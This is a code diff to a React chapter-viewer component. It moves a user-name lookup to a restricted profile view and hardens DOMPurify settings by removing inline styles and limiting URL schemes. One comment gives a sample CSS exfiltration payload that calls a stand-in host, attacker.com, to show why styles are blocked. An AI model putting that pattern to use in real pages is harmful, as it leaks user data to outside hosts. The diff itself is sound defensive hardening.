@@ -259,9 +259,15 @@ const ChapterViewer = () => {
     ((commentsRes.data || []) as any[]).forEach((c: any) => allUserIds.add(c.user_id));
     let userNameMap: Record<string, string> = {};
     if (allUserIds.size > 0) {
+      // public_user_profiles is the column-safe view introduced in
+      // 20260417100000_foundation_hardening.sql. We use it instead of
+      // querying the users table directly because users RLS only
+      // exposes the caller's own row to non-admins; the view exposes
+      // id/full_name/avatar_url/member_number/occupation for every
+      // authenticated peer (no email/phone/bio/city).
       const { data: users } = await supabase
-        .from("users").select("id, full_name").in("id", [...allUserIds]);
-      (users || []).forEach((u) => { userNameMap[u.id] = u.full_name || "Anonymous"; });
+        .from("public_user_profiles" as any).select("id, full_name").in("id", [...allUserIds]);
+      ((users as any[]) || []).forEach((u: any) => { userNameMap[u.id] = u.full_name || "Anonymous"; });
     }
 
     const qnaWithReplies: QnaItem[] = qnaItems.map((q) => ({
@@ -668,7 +674,24 @@ const ChapterViewer = () => {
               )}
               {chapter.article_body && (
                 <div className="prose prose-invert prose-sm max-w-none">
-                  <div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(chapter.article_body, { ALLOWED_TAGS: ['p','br','strong','b','em','i','u','h1','h2','h3','h4','h5','h6','ul','ol','li','a','code','pre','blockquote','img','table','thead','tbody','tr','th','td','hr','span','div','figure','figcaption','sup','sub'], ALLOWED_ATTR: ['href','target','rel','src','alt','width','height','class','id','style'] }) }} />
+                  {/*
+                    DOMPurify config notes:
+                    - `style` is intentionally NOT in ALLOWED_ATTR. Inline styles
+                      permit CSS-based exfiltration (e.g. `background-image:
+                      url('attacker.com/pixel?data=...')`) and can be used to
+                      spoof UI chrome. Presentation stays in CSS classes.
+                    - `FORCE_BODY` prevents DOMPurify from upgrading fragments
+                      to full documents.
+                    - `ALLOWED_URI_REGEXP` restricts anchor/img URLs to http(s)
+                      and mailto, blocking `javascript:`, `data:`, and other
+                      schemes that can bypass the tag filter.
+                  */}
+                  <div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(chapter.article_body, {
+                    ALLOWED_TAGS: ['p','br','strong','b','em','i','u','h1','h2','h3','h4','h5','h6','ul','ol','li','a','code','pre','blockquote','img','table','thead','tbody','tr','th','td','hr','span','div','figure','figcaption','sup','sub'],
+                    ALLOWED_ATTR: ['href','target','rel','src','alt','width','height','class','id'],
+                    ALLOWED_URI_REGEXP: /^(?:(?:https?|mailto):|[^a-z]|[a-z+.\-]+(?:[^a-z+.\-:]|$))/i,
+                    FORCE_BODY: true,
+                  }) }} />
                 </div>
               )}
             </TabsContent>
